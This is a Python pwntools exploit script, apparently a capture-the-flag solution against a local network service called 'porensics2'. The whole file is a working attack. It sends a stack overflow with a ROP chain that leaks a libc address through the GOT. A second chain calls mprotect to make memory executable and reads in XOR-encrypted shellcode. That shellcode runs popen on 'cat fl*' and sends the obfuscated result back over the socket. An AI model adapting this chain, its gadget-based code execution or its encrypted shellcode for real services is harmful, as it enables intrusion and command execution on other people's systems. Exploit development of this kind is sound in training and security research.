from pwn import *
import os, subprocess
from secrets import token_bytes


binary = "./porensics2"
elf = context.binary = ELF(binary, checksec=False)
libc = ELF("./libc.so.6", checksec=False)

gs = """
set follow-fork-mode child
break *check_password+476
continue
"""

if args.REMOTE:
    p = remote("localhost", 1337)
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    os.system('./porensics2 &')
    sleep(0.5)
    pid = int(subprocess.getoutput("pgrep -f '^./porensics2'"))
    print(f"PID: {pid}")
    # do "echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope" if gdb attach fails
    gdb.attach(pid, gdbscript=gs)
    p = remote("localhost", 1337)
else:
    os.system('./porensics2 &')
    p = remote("localhost", 1337)



### GET LIBC LEAK ###
p.sendline(b'legoclones\x00')
sleep(0.5)
payload = flat(
    b'password\x00',                            # pass the pwd check
    token_bytes(199),
    b'admin\x00',                               # pass the admin check
    token_bytes(218),

    ### BEGIN ROP CHAIN ###
    token_bytes(8),                             # rbp
    p64(0x4004d5),                              # pop rsi; ret
    p64(elf.got['setsockopt']),                 # rsi (setsockopt@GOT)
    p64(elf.plt['write']),                      # write(4, setsockopt@GOT, 0x2c)
    p64(elf.sym['check_password']),             # return to check_password to allow 2nd stage
)
p.sendline(payload)

p.recvuntil(b'Welcome to Porensics Inc.\n')
leak = u64(p.recv(8))
print(f"Leak: {hex(leak)}")
libc_base = leak - libc.sym['setsockopt']
print(f"Libc base: {hex(libc_base)}")
libc.address = libc_base



### RET2MPROTECT ###
input("Press enter to continue...")
p.sendline(b'legoclones\x00')
sleep(0.5)
payload3 = flat(
    b'password\x00',                            # pass the pwd check
    token_bytes(199),
    b'admin\x00',                               # pass the admin check
    token_bytes(218),

    ### BEGIN ROP CHAIN ###
    token_bytes(8),                             # rbp

    p64(libc_base + 0x10f75b),                  # pop rdi; ret
    p64(0x403000),                              # rdi (mprotect addr, page aligned)

    p64(libc_base + 0x110a4d),                  # pop rsi; ret
    p64(0x1000),                                # rsi (size)

    p64(libc_base + 0xa876e),                   # pop rcx; ret
    p64(0x403f00),                              # rcx (writable address for rdx gadget)

    p64(libc_base + 0xab891),                   # pop rdx; ret
    p64(7),                                     # rdx (PROT_READ | PROT_WRITE | PROT_EXEC)

    p64(libc.sym['mprotect']),                  # mprotect(0x403000, 0x1000, 7)


    ### WRITE SHELLCODE ###
    p64(libc_base + 0x10f75b),                  # pop rdi; ret
    p64(4),                                     # rdi (client fd)

    p64(libc_base + 0x110a4d),                  # pop rsi; ret
    p64(0x403200),                              # rsi (buffer)

    p64(libc_base + 0xa876e),                   # pop rcx; ret
    p64(0x403f00),                              # rcx (writable address for rdx gadget)

    p64(libc_base + 0xab891),                   # pop rdx; ret
    p64(0x400),                                 # rdx (size)

    p64(libc.sym['read']),                      # read(4, 0x403200, 0x400)

    ### JMP TO SHELLCODE ###
    p64(0x403200),                              # jump to shellcode
)
p.sendline(payload3)



### SHELLCODE ###
p.recvuntil(b'Inc.')
shellcode_xor_key = bytes.fromhex(hex(((libc_base + 0x11ba61) * 0x1337) & 0xffffffffffffffff)[2:].zfill(16))[::-1]
print(f"Shellcode XOR key: {shellcode_xor_key}")
shellcode1 = asm(
"""
    // derive the encrypted shellcode XOR key into $rax
    // ($rcx is libc_base + 0x11ba61)
    mov rax, rcx
    mov r13, 0x1337
    mul r13

    // decrypt the shellcode
    mov r13, 0x403300
loop:
    cmp r13, 0x403400
    je end_loop
    xor qword ptr [r13], rax
    add r13, 0x8
    jmp loop

end_loop:
    mov rax, 0x403300
    jmp rax
""")

shellcode2 = asm(
f"""
mov rbx, rdi                # save the client fd (rdi) to rbx

// popen('cat flag.txt')
mov r8, 0x2a6c6620746163    # 'cat fl*'
push r8
mov rdi, rsp                # arg1
sub rsp, 0x28               # align stack
mov rsi, 0x4012c8           # 'r'
mov rax, {hex(libc.sym['popen'])} # popen
call rax

// fgets_unlocked($rsp, 0x30, $rax)
mov rdi, rsp                # arg1
mov rsi, 0x30               # arg2
mov rdx, rax                # arg3 (FILE*)
mov rax, {hex(libc.sym['fgets'])} # fgets
call rax

// XOR flag with 0xd16f82ec02df502f
mov r9, 0xd16f82ec02df502f  # XOR key
xor qword ptr [rsp], r9     # XOR the first 8 bytes of the
add rsp, 0x8
xor qword ptr [rsp], r9
add rsp, 0x8
xor qword ptr [rsp], r9
add rsp, 0x8
xor qword ptr [rsp], r9
add rsp, 0x8
xor qword ptr [rsp], r9
add rsp, 0x8

sub rsp, 0x28               # reset rsp

// write 0x30 bytes to the client fd
mov rdi, rbx                # restore the client fd
mov rsi, rsp                # arg2 (buffer)
mov rdx, 0x28               # arg3 (size)
mov rax, 1                  # syscall number for write
syscall

// exit
mov rdi, 0                  # status 0
mov rax, 0x3c               # syscall number for exit
syscall
""")

shellcode = flat(
    shellcode1,
    token_bytes(0x100 - len(shellcode1)),       # random padding
    xor(shellcode2, shellcode_xor_key),         # encrypted shellcode
)
print(f"Shellcode length: {len(shellcode)}")
input("Press enter to continue...")
p.sendline(shellcode)



### FLAG + CLEANUP ###
p.recvline()
print(xor(p.recvall(), p64(0xd16f82ec02df502f)))

p.close()
os.system('fuser -k 1337/tcp')